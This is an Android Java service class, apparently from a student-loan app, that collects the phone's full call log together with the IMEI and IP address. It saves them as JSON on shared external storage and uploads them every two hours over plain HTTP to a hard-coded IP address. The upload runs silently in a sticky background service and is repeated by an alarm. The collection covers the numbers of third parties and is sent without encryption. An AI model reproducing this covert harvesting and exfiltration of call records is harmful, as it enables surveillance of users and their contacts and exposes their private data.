package com.eduvanz.newUI.services;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.CallLog;
import android.support.annotation.Nullable;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.eduvanz.newUI.MainApplication;
import com.eduvanz.Utils;
import com.eduvanz.newUI.receiver.AlarmReceiverForFileUpload;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

import static com.eduvanz.newUI.MainApplication.TAG;

/**
 * Created by projetctheena on 19/9/17.
 */

public class MyServiceCallLog extends Service {

    public static Context context;
    static String stringAllSmsContacts;
    public static String latestSmsDate = "";
    public static String userID="", userMobileNo="", userLoggedinID="";
    private LongOperation longOperation = null, longOperation2 = null, longOperation3 = null, longOperation4 = null;
    public static String mobileNo = "", userid = "", data = "", page = "", userName = "", imeiNo = "", simImei = "", ipaddress = "";
    String callTimeStamp;
    public static Date lDateCall;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        Log.e(MainApplication.TAG, "Service onCreate");
        context = this;
        Log.e(MainApplication.TAG, "Alarm received!: ");
        Log.e(TAG, "MyService CALL LOG  : 11111111111111111111111111" );
        /** getting data from shared preference **/
        SharedPreferences sharedPreferences = context.getSharedPreferences("UserData", Context.MODE_PRIVATE);
//        userLoggedinID = sharedPreferences.getString("logged_id", "null");
        userMobileNo = sharedPreferences.getString("mobile_no", "null");
        callTimeStamp = sharedPreferences.getString("callTimeStamp", "null");
        Log.e(TAG, "onCreate: "+callTimeStamp );
        try {
            SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            lDateCall= simpleDateFormat.parse(callTimeStamp);
        } catch (ParseException e) {
            e.printStackTrace();
        }

//        userID = sharedPreferences.getString("logged_id", "null");
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            imeiNo = telephonyManager.getDeviceId();
            ipaddress = Utils.getIPAddress(true);
            Log.e(MainApplication.TAG, "PHONE DATA " + "IMEINO:=" + imeiNo + "ipaddress:" + ipaddress );
        }catch (Exception e){
            e.printStackTrace();
        }

        // adding pending intent
        PendingIntent pendingIntent;
        Intent intent = new Intent(context, AlarmReceiverForFileUpload.class);
        pendingIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Calendar calendar = Calendar.getInstance();
        int interval = 2 * 60 * 60 * 1000;
//            int interval = 2 * 1000;
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), interval, pendingIntent);
    }



    /**
     * CALL LOGS READ
     **/

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    public static void callLogs(Context context)
    {
        Log.e(MainApplication.TAG, " callLogs: 444444444444444444444444444444444" );
        String phNumber="", callType="", callDuration="", logs="";
        JSONArray jsonArray = new JSONArray();
        JSONObject outerOb = new JSONObject();

        if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");

        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);

        while (cursor.moveToNext())
        {
            phNumber = cursor.getString(number);
            callType = cursor.getString(type);
            String callDate = cursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            callDuration = cursor.getString(duration);
            String dir = null;

            if(lDateCall != null)
            {
                if (lDateCall.getTime() < callDayTime.getTime()) {
                    JSONObject mObject = new JSONObject();
                    try {
                        mObject.accumulate("callee_number", phNumber);
                        mObject.accumulate("call_type", callType);
                        mObject.accumulate("call_duration", callDuration);
                        mObject.accumulate("call_date", callDayTime);
                        jsonArray.put(mObject);

                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                } else {
                    Log.e(TAG, "callLogs: previous date");
                }
            }else {
                JSONObject mObject = new JSONObject();
                try {
                    mObject.accumulate("callee_number", phNumber);
                    mObject.accumulate("call_type", callType);
                    mObject.accumulate("call_duration", callDuration);
                    mObject.accumulate("call_date", callDayTime);
                    jsonArray.put(mObject);

                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        }
        cursor.close();
        try {
//            outerOb.accumulate("student_id", userID);
//            outerOb.accumulate("student_mobile_no", userMobileNo);
            outerOb.accumulate("created_by_ip", ipaddress);
//            outerOb.accumulate("sim_serial_no", simImei);
            outerOb.accumulate("sim_serial_no", imeiNo);
            outerOb.accumulate("imei", imeiNo);
            outerOb.accumulate("mobileNo", userMobileNo);
            outerOb.put("call_logs", jsonArray);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        Log.e(TAG, "callLogs: "+jsonArray );
        if(jsonArray.length()>0)
        {
            logs = outerOb.toString();
            mCreateAndSaveFile("saveCallLogs.json", logs);
        }
    }

    public static void mCreateAndSaveFile(String params, String mJsonResponse) {
        Log.e(MainApplication.TAG, " mCreateAndSaveFile:" );
        try {
            String path = "/storage/sdcard0/" + params;
            final File dir = new File(Environment.getExternalStorageDirectory() + "/");
            if (dir.exists() == false) {
                dir.mkdirs();
            }
            File f = new File(dir, params);
            f.getAbsolutePath();
            FileWriter file = new FileWriter(f.getAbsolutePath());
            file.write(mJsonResponse);
            file.flush();
            file.close();
            mReadJsonData(params);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }



    public static void mReadJsonData(final String filename) {
        Log.e(TAG, "mReadJsonData: " );
        final File dir = new File(Environment.getExternalStorageDirectory()+"/");
        if (dir.exists() == false) {
            dir.mkdirs();
        }
        final File f = new File(dir, filename);
        new Thread(new Runnable() {
            @Override
            public void run() {
                uploadFile(f.getAbsolutePath(), filename);
            }
        }).start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        Log.e(MainApplication.TAG, "Service onStartCommand");
        Log.e(TAG, "selectOperations: " );
        longOperation3 = new LongOperation();
        longOperation3.execute("calllogs");
        //start sticky means service will be explicity started and stopped
        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {

    }

    /** ---------------- ASYNC TASK --------------**/
    private class LongOperation extends AsyncTask<String, Void, Void> {

        @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
        @Override
        protected Void doInBackground(String... params) {
            Log.e(TAG, "doInBackground: callLogs "+params[0] );
            callLogs(context);
            return null;
        }

        @Override
        protected void onPreExecute() {}

        @Override
        protected void onProgressUpdate(Void... values) {}
    }


    /** upload SMS file to server **/
    public static int uploadFile(final String selectedFilePath, String fileType) {
        String a=fileType;
//        String[]  scrapingfileName = a.split(".");
       a= a.substring(0, a.lastIndexOf('.'));

        StringBuffer sb;
        long total = 0;
//        String urlup = "http://139.59.32.234/sms/Api/send_message";
        String urlup = "http://139.59.32.234/eduvanzApi/mobilescrap/send_message";
        int serverResponseCode = 0;

        Log.e(TAG, "uploadFile: 999999999999999999999999999999" );
        Log.e(TAG, "uploadFile:"+"  file name : "+ a );

        HttpURLConnection connection;
        DataOutputStream dataOutputStream;
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";

        final int count,fileLength;

        int bytesRead, bytesAvailable, bufferSize;
        byte[] buffer;
        int maxBufferSize = 1 * 1024 * 1024;
        File selectedFile = new File(selectedFilePath);

        Log.e(TAG, "uploadFile: "+selectedFilePath );
        String[] parts = selectedFilePath.split("/");
        final String fileName = parts[parts.length - 1];

        if (!selectedFile.isFile()) {
            //dialog.dismiss();

//            runOnUiThread(new Runnable() {
//                @Override
//                public void run() {
            Log.e("ReadSms", "run: " + "Source File Doesn't Exist: " + selectedFilePath);
//                }
//            });
            return 0;
        }
        else {
            try {
//                runOnUiThread(new Runnable() {
//                    @Override
//                    public void run() {
//                        showProressBar("Please wait verifying user credentials");
//                    }
//
//                });


                FileInputStream fileInputStream = new FileInputStream(selectedFile);
                URL url = new URL(urlup);
                connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setDoInput(true);//Allow Inputs
                connection.setDoOutput(true);//Allow Outputs
                connection.setUseCaches(false);//Don't use a cached Copy
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Connection", "Keep-Alive");
                connection.setRequestProperty("ENCTYPE", "multipart/form-data");
                connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
                connection.setRequestProperty(a, selectedFilePath);
//                connection.setRequestProperty("file_name", "saveSMS");
                Log.e("ReadSms", "Server property" + connection.getRequestMethod() + ":property " + connection.getRequestProperties());


                //creating new dataoutputstream
                dataOutputStream = new DataOutputStream(connection.getOutputStream());

                //writing bytes to data outputstream
                dataOutputStream.writeBytes(twoHyphens + boundary + lineEnd);
                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\""+a+"\";filename=\""
//                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"saveCallLogs\";filename=\""
                        + selectedFilePath + "\"" + lineEnd);
                dataOutputStream.writeBytes(lineEnd);

                //returns no. of bytes present in fileInputStream
                bytesAvailable = fileInputStream.available();
                //selecting the buffer size as minimum of available bytes or 1 MB
                bufferSize = Math.min(bytesAvailable, maxBufferSize);
                //setting the buffer as byte array of size of bufferSize
                buffer = new byte[bufferSize];
                fileLength=bufferSize;
                //reads bytes from FileInputStream(from 0th index of buffer to buffersize)
                bytesRead = fileInputStream.read(buffer, 0, bufferSize);

                Log.e(TAG, "uploadFile: TOTAL bytes to read "+bytesRead+"total"+bufferSize );
                //loop repeats till bytesRead = -1, i.e., no bytes are left to read
                total=0;

                while (bytesRead > 0) {
                    total+=bytesRead;
                    //write the bytes read from inputstream
                    dataOutputStream.write(buffer, 0, bufferSize);
                    Log.e("ReadSms", " here: \n\n" + buffer + "\n" + bufferSize);
                    bytesAvailable = fileInputStream.available();
                    bufferSize = Math.min(bytesAvailable, maxBufferSize);
                    bytesRead = fileInputStream.read(buffer, 0, bufferSize);
                    Log.e(TAG, "uploadFile: "+bytesRead+total );
                    Log.e(TAG, "uploadFile: percentage "+((int) Math.round(total * 100 / fileLength)) );
                    // Publish the progress
                    final int finalBytesRead = bytesRead;
//                    runOnUiThread(new Runnable() {
//                        @Override
//                        public void run() {

                    Log.e(TAG, "uploadFile: percentage "+((int) Math.round(total * 100 / fileLength)) );
//                            mDialog.setProgress((int) Math.round(total * 100 / fileLength));
//                        }
//                    });
                }
                dataOutputStream.writeBytes(lineEnd);
                dataOutputStream.writeBytes(twoHyphens + boundary + lineEnd);
                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"file_name\"" + lineEnd);
                dataOutputStream.writeBytes(lineEnd);
                dataOutputStream.writeBytes("1");
                dataOutputStream.writeBytes(lineEnd);
                dataOutputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

                dataOutputStream.writeBytes(twoHyphens + boundary + lineEnd);
//                taOutputStream.writeBytes("Content-Disposition: form-data; name=\"document\";filename=\""
//                        + selectedFilePath + "\"" + lineEnd);
                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"mobileNo\";mobileNo=" + userMobileNo + "" + lineEnd);
                dataOutputStream.writeBytes(lineEnd);
                dataOutputStream.writeBytes(userMobileNo);
                dataOutputStream.writeBytes(lineEnd);

                //dataOutputStream.writeBytes(URLEncoder.encode("user_id", "UTF-8")
                //        + "=" + URLEncoder.encode("1", "UTF-8"));

                serverResponseCode = connection.getResponseCode();
                Log.e("ReadSms", " here:server response \n\n" + serverResponseCode);
                String serverResponseMessage = connection.getResponseMessage();
                Log.e("ReadSms", " here: server message \n\n" + serverResponseMessage.toString() + "\n" + bufferSize);
                BufferedReader br = new BufferedReader(new InputStreamReader((connection.getInputStream())));
                String output = "";
                sb = new StringBuffer();

                while ((output = br.readLine()) != null) {
                    sb.append(output);
                    Log.e("ReadSms", "uploadFile:MYSERVICECALLLOG " + br);
                    Log.e("ReadSms", "Server Response is: MYSERVICECALLLOG" + serverResponseMessage + ": " + serverResponseCode);
                }
                Log.e("ReadSms ", "uploadFile: " + sb.toString());

                //response code of 200 indicates the server status OK
                if (serverResponseCode == 200) {
//                    runOnUiThread(new Runnable() {
//                        @Override
//                        public void run() {
//                            Toast.makeText(context, sb.toString(), Toast.LENGTH_SHORT).show();
                    Log.e(TAG, "uploadFile:CALL LOG  "+sb.toString() );

                    Log.e("ReadSms", " here: CALL LOG \n\n" + fileName);
//                        }
//                    });
                    try {
                        JSONObject mObject = new JSONObject(sb.toString());
                        JSONObject resultsData=mObject.getJSONObject("result");
                        String callTimeStamp =resultsData.getString("callTimeStamp");
                        Log.e(TAG, "uploadFile: "+callTimeStamp );
                        try {
                            SharedPreferences sharedPreferences = context.getSharedPreferences("UserData", Context.MODE_PRIVATE);
                            SharedPreferences.Editor editor = sharedPreferences.edit();
                            editor.putString("callTimeStamp",callTimeStamp);
                            editor.apply();
                            editor.commit();
                            Log.e(TAG, "uploadFile: SAVED" );
                        }catch (Exception e){
                            e.printStackTrace();
                            Log.e(TAG, "uploadFile: Not SAVED" );
                        }
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

//                    {"callLogs":"Send Call Logs Is Sucessfull.\\n","result":
//                        {"callTimeStamp":"2017-11-30 15:57:01"},"status":1,"message":"success"}
                }

                //closing the input and output streams
                fileInputStream.close();
                dataOutputStream.flush();
                dataOutputStream.close();


            } catch (FileNotFoundException e) {
                e.printStackTrace();
//                runOnUiThread(new Runnable() {
//                    @Override
//                    public void run() {
//                        Toast.makeText(context, "File Not Found", Toast.LENGTH_SHORT).show();
                Log.e(TAG, "uploadFile: "+"File Not Found" );
//                    }
//                });
            } catch (MalformedURLException e) {
                e.printStackTrace();
//                Toast.makeText(context, "URL error!", Toast.LENGTH_SHORT).show();
                Log.e(TAG, "uploadFile: "+"URL error!" );

            } catch (IOException e) {
                e.printStackTrace();
//                Toast.makeText(context, "Cannot Read/Write File!", Toast.LENGTH_SHORT).show();
                Log.e(TAG, "uploadFile: "+"Cannot Read/Write File!" );
            }
//            dialog.dismiss();
            return serverResponseCode;
        }
    }

}
